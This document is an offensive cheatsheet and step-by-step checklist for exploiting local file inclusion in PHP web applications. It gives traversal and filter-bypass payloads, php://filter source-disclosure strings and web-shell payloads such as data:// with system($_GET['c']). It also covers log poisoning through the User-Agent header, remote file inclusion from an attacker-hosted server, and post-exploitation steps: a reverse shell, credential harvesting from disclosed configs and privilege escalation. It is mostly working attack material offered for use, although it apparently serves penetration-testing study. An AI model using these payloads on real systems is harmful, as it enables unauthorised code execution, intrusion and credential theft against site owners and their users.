## Cheatsheet

### Basic LFI Payloads
```
/etc/passwd                                 # absolute path
../../../../etc/passwd                      # traversal
../../../../../../../../../etc/passwd       # overly deep (safe default)
/../../../../etc/passwd                     # leading slash (for appended prefix)
```

### Filter Bypass — Nested
```
....//....//....//etc/passwd
..././..././..././etc/passwd
...\/...\/...\/etc/passwd
```

### Filter Bypass — URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                    # single encoding
%252e%252e%252f%252e%252e%252fetc%252fpasswd               # double encoding
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd                       # UTF-8 overlong
```

### Filter Bypass — Approved Path
```
./language/../../../../etc/passwd
./allowed/../../../etc/passwd
```

### Filter Bypass — Null Byte (PHP < 5.5)
```
/etc/passwd%00
/etc/passwd%00.php
```

### Filter Bypass — Path Truncation (PHP < 5.3)
```bash
echo -n "nonexistent/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

### PHP Wrappers — Source Disclosure
```
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=index
php://filter/read=convert.base64-encode/resource=admin/login
php://filter/convert.base64-encode|convert.base64-encode/resource=config     # chained
php://filter/read=string.rot13/resource=config                                # alt encoding
```

### PHP Wrappers — Direct RCE
```
data://text/plain,<?php system($_GET['c']); ?>&c=id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
php://input                                              # with POST body = PHP code
expect://id                                              # requires Expect PECL
zip:///tmp/upload.zip%23shell.php                        # PHP in uploaded zip
phar://upload.phar/shell.php                             # PHP in uploaded phar
```

### Log Poisoning
```
# Inject via User-Agent:
User-Agent: <?php system($_GET['c']); ?>

# Include the log:
?file=/var/log/apache2/access.log&c=id
?file=/var/log/nginx/access.log&c=id
?file=/var/log/auth.log&c=id             # after SSH with malicious username
```

## Checklist

### Identify LFI Candidates
- [ ] Enumerate parameters that reference files, pages, or templates
- [ ] Test each with `/etc/passwd` and `C:\Windows\win.ini`
- [ ] Watch for distinctive strings (`root:x:0:0:`, `[fonts]`) in responses
- [ ] Note any error messages — often leak the base path

### Determine Vulnerability Pattern
- [ ] Unmodified input → absolute path works directly
- [ ] Prepended directory → use `../` traversal
- [ ] Prepended prefix (not directory) → use `/` prefix
- [ ] Appended extension → need PHP wrappers to bypass

### Try Basic Payloads First
- [ ] `/etc/passwd`
- [ ] `../../../../etc/passwd`
- [ ] `/../../../../etc/passwd`
- [ ] If blocked, try one bypass at a time

### Filter Bypass Progression
- [ ] Try `....//` for single-pass `../` stripping
- [ ] Try URL encoding (single, then double)
- [ ] Try case variation (if Windows)
- [ ] Try approved-path + traversal if regex is strict
- [ ] Try PHP wrappers for appended-extension filters

### Source Code Disclosure
- [ ] Use `php://filter/read=convert.base64-encode/resource=<file>`
- [ ] Start with `index`, `config`, `.env`
- [ ] Decode locally: `echo '<b64>' | base64 -d`
- [ ] Mine disclosed source for credentials, API keys, further files
- [ ] Recursively disclose referenced files

### Identify Capability
- [ ] Determine the inclusion function (from errors, source disclosure, behavior)
- [ ] Check the capability matrix — can it execute? fetch remote?
- [ ] Check `php.ini` values via `phpinfo.php` if you can read it

### LFI to RCE
- [ ] Try `data://text/plain,<?php ... ?>` (requires `allow_url_include=On`)
- [ ] Try `php://input` with PHP in POST body (same requirement)
- [ ] Try log poisoning via `User-Agent` + include access log
- [ ] Try PHP session file poisoning
- [ ] Try `/proc/self/environ` (CGI only)
- [ ] Try file upload + include if an upload exists

### RFI (if capability allows)
- [ ] Confirm outbound HTTP from target to your listener
- [ ] Host PHP payload on attacker server
- [ ] Trigger inclusion with your URL
- [ ] If HTTP blocked, try SMB (Windows) or FTP

### Post-Exploitation
- [ ] Upgrade to reverse shell immediately
- [ ] Enumerate for lateral movement (SSH keys, DB creds from disclosed configs)
- [ ] Check what user the web server runs as (`id`, `whoami`)
- [ ] Hunt for privilege escalation vectors
